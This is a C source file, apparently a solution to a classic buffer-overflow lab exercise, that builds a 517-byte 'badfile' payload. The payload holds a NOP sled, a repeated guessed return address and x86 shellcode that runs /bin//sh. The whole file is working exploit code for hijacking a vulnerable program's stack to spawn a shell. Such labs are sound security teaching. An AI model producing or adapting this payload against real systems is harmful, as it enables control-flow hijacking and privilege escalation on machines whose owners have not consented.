/* exploit.c */
/* A program that creates a file "badfile" containing code for launching shell */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define BUFFER_SIZE 517 // Represent the size of the buffer
#define OFFSET 400 // Represent the offset from buffer

char shellcode[] =
  "\x31\xc0"
  "\x50"
  "\x68""//sh"
  "\x68""/bin"
  "\x89\xe3"
  "\x50"
  "\x53"
  "\x89\xe1"
  "\x99"
  "\xb0\x0b"
  "\xcd\x80"
;

void fillBuffer(char buffer[BUFFER_SIZE]) {
  // Get the size of the shellcode
  int shellcodeSize = sizeof(shellcode);

  // Represent an estimate return address that will eventually allow shellcode to be executed
  // by using the address of the buffer and an offset value (400 bytes after the buffer in this case)
  long *returnAddress = (long *) (buffer+OFFSET);

  // Get a long integer pointer of the buffer to reference each 4-bytes hexadecimal in a stack memory address
  long *bufferPtr = (long *) buffer;

  // Represent index for the "for" loop
  int i;

  // Get the starting index of the null-terminated shellcode in the buffer
  // (i.e. null-terminated shellcode is inserted at the end of the buffer)
  int shellcodeStartIndex = (BUFFER_SIZE-(shellcodeSize+1));

  // Represent counter for the shellcode
  int shellcodeCounter = 0;

  // Loop 25 times (each time modifying the 4-bytes hexadecimal in the stack memory address starting from the buffer)
  for (i = 0; i < 25; i++) {
    *bufferPtr = (long) returnAddress; // Assign the estimate return address to a 4-bytes hexadecimal in the stack memory address
    bufferPtr++; // Go to the next 4-bytes hexadecimal in the stack memory address (because long integer is 4-bytes portion)
  }

  // Insert shellcode (without null-termination) at the end of the buffer
  for (i = shellcodeStartIndex; i < (BUFFER_SIZE-1); i++) {
    buffer[i] = shellcode[shellcodeCounter];
    shellcodeCounter++;
  }

  // Null-terminate the shellcode
  buffer[BUFFER_SIZE-1] = '\0';
}

void main(int argc, char **argv) {
  char buffer[BUFFER_SIZE];
//	printf("buffer addr (%p)\n", buffer);
  FILE *badfile;

  /* Initialize buffer with 0x90 (NOP instruction) */
  memset(&buffer, 0x90, BUFFER_SIZE);

  /* You need to fill the buffer with appropriate contents here */
  fillBuffer(buffer);

  /* Save the contents to the file "badfile" */
  badfile = fopen("./badfile", "w");
  fwrite(buffer, BUFFER_SIZE, 1, badfile);
  fclose(badfile);
}
